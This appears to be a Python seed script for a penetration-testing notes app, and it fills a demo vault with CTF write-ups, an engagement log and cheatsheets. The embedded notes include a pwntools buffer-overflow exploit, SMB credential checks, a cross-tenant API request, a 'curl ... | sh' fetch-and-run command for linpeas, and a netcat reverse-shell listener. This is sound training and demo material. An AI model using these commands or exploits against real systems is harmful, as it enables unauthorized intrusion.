"""Seed a realistic demo vault for screenshots, onboarding, and testing."""

from __future__ import annotations

from redscribe.storage.db import Vault

_HTB = r"""# HTB — Corporate

> Demo content. `10.10.10.42` is an example address and the flags are fake.

- **OS:** Windows Server 2019
- **Entry point:** public web app
- **Access:** domain user → local administrator
- **Difficulty:** Medium

## Recon

`nmap` found SMB, WinRM, and an internal GitLab instance.

```bash
nmap -sC -sV -p- --min-rate 2000 -oA nmap/corporate 10.10.10.42
```

| Port | Service | Version |
|------|---------|---------|
| 80 | http | nginx 1.24 |
| 445 | smb | Windows Server 2019 |
| 5985 | winrm | Microsoft HTTPAPI 2.0 |

## Foothold

The support portal exposed a backup archive. Extracted credentials worked
against SMB and revealed a writable share used by a scheduled task.

```bash
netexec smb 10.10.10.42 -u svc-backup -p 'Summer2026!' --shares
```

## Privilege escalation

The scheduled task ran as SYSTEM from a world-writable directory.

- [x] Enumerate shares
- [x] Recover credentials
- [x] Replace the scheduled binary
- [x] Capture the flags

## Loot

```text
HTB{th1s_1s_4_d3m0_fl4g}
```

## Lessons

- Backups are still the best initial-access vector.
- Check task permissions, not just share permissions.
"""

_PICO = r"""# picoCTF — buffer overflow 1

> Demo content for the picoCTF-style challenge.

## Description

The binary reads more bytes than the destination buffer can hold.

```bash
file ./vuln
checksec --file=./vuln
```

`checksec` reports **No PIE**, **No canary**, and **NX disabled**.

## Analysis

The offset to the return address is 44 bytes. A `win()` function calls
`system("/bin/sh")`.

```python
from pwn import *

io = process("./vuln")
payload = b"A" * 44 + p32(0x080491F6)
io.sendline(payload)
io.interactive()
```

## Flag

```text
picoCTF{demo_buffer_overflow}
```
"""

_ENGAGEMENT = r"""# ACME external — week 1

- **Client:** ACME (demo)
- **Scope:** `app.acme.test`, `api.acme.test`
- **Window:** 2026-10-19 → 2026-10-30
- **Rules:** no destructive testing, no social engineering
- **Emergency contact:** security@acme.test

## Objectives

- [x] Baseline the external footprint
- [ ] Authentication and session review
- [ ] Authorization testing across tenants
- [ ] Draft findings and evidence

## Daily log

### 2026-10-21

- Confirmed the staging login accepts legacy TLS.
- Found a verbose API error that leaks stack traces.
- Captured requests for the authorization matrix.

## Credentials

| User | Secret | Source | Notes |
|------|--------|--------|-------|
| tester@acme.test | (vault) | client | standard user |
| admin@acme.test | (vault) | client | admin sandbox |

## Findings

| Severity | Title | Status |
|----------|-------|--------|
| High | Cross-tenant object access | Open |
| Medium | Verbose error responses | Triaged |

## Deliverables

- [ ] Draft report
- [ ] Client review
- [ ] Final report
"""

_ACME_HOST = r"""# ACME — app.acme.test

> Target: `app.acme.test` · Scope: external web assessment

## Snapshot

- **IP:** 203.0.113.24
- **OS:** Ubuntu 24.04
- **Reverse proxy:** nginx 1.26
- **App:** Django 5.1 + PostgreSQL
- **Access:** standard user

## Port scan

```bash
nmap -sC -sV -p- -oA nmap/acme-web app.acme.test
```

| Port | Service | Notes |
|------|---------|-------|
| 80 | http | redirects to HTTPS |
| 443 | https | valid certificate |
| 22 | ssh | key-only |

## Test log

- [x] Enumerate routes and API schema
- [x] Check authorization on `/api/orgs/{id}`
- [ ] Review file upload handling
- [ ] Check password reset flow

## Finding

### Cross-tenant object access

The API trusts the `org_id` path segment without checking membership.

```http
GET /api/orgs/42/invoices HTTP/1.1
Host: app.acme.test
Authorization: Bearer <standard-user-token>
```

Response: `200 OK` with another tenant's invoices.

- **Impact:** Confidential invoice data is readable across tenants.
- **Remediation:** Enforce membership on every object lookup.
"""

_LINUX_PRIVESC = r"""# Linux privilege escalation

> Personal cheatsheet. Use only on systems you own or are authorized to test.

## First pass

```bash
id
sudo -l
uname -a
cat /etc/os-release
```

## SUID and capabilities

```bash
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```

## Scheduled tasks

```bash
cat /etc/crontab
ls -la /etc/cron.* /etc/cron.d 2>/dev/null
crontab -l
```

## Automated audits

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
./pspy64 -pf -i 1000
```

## GTFOBins workflow

1. Identify a binary with unusual privileges.
2. Look up the binary on GTFOBins.
3. Prefer the least disruptive escalation path.
4. Record every command you run.
"""

_NMAP = r"""# Nmap quick reference

```bash
# Fast top-1000 scan with versions and default scripts
nmap -sC -sV -oA nmap/quick <TARGET>

# Full TCP scan
nmap -p- --min-rate 2000 -oA nmap/full <TARGET>

# UDP top ports
sudo nmap -sU --top-ports 100 -oA nmap/udp <TARGET>

# Host discovery only
nmap -sn <TARGET>/24
```

## Reading results

| State | Meaning |
|-------|---------|
| open | A service accepted a connection |
| closed | Host responded, no listener |
| filtered | No response, likely a firewall |
"""


def seed_demo(vault: Vault) -> int:
    """Populate an empty vault with demo notes and return the note count."""
    stats = vault.basic_stats()
    if stats.notes or stats.folders:
        return 0

    ctf = vault.create_node("CTF Challenges", kind="folder")
    engagements = vault.create_node("Engagements", kind="folder")
    cheatsheets = vault.create_node("Cheatsheets", kind="folder")

    vault.create_node(
        "HTB — Corporate",
        ctf.id,
        content=_HTB,
        tags="htb,windows,smb,privesc",
        target="10.10.10.42",
        status="done",
        difficulty="medium",
        flag="HTB{th1s_1s_4_d3m0_fl4g}",
        pinned=True,
    )
    vault.create_node(
        "picoCTF — buffer overflow 1",
        ctf.id,
        content=_PICO,
        tags="picoctf,pwn,linux",
        target="./vuln",
        status="active",
        difficulty="easy",
        flag="picoCTF{demo_buffer_overflow}",
    )
    vault.create_node(
        "ACME external — week 1",
        engagements.id,
        content=_ENGAGEMENT,
        tags="engagement,web,report",
        target="app.acme.test",
        status="active",
        difficulty="",
    )
    vault.create_node(
        "ACME — app.acme.test",
        engagements.id,
        content=_ACME_HOST,
        tags="web,host,api",
        target="app.acme.test",
        status="done",
        difficulty="medium",
    )
    vault.create_node(
        "Linux privilege escalation",
        cheatsheets.id,
        content=_LINUX_PRIVESC,
        tags="linux,privesc,cheatsheet",
        status="todo",
        pinned=True,
    )
    vault.create_node(
        "Nmap quick reference",
        cheatsheets.id,
        content=_NMAP,
        tags="recon,nmap,cheatsheet",
        status="todo",
    )
    vault.create_snippet(
        "Local listener",
        "nc -lvnp 4444",
        "Catch a reverse shell during an authorized assessment.",
        "shell,listener",
    )
    return 6
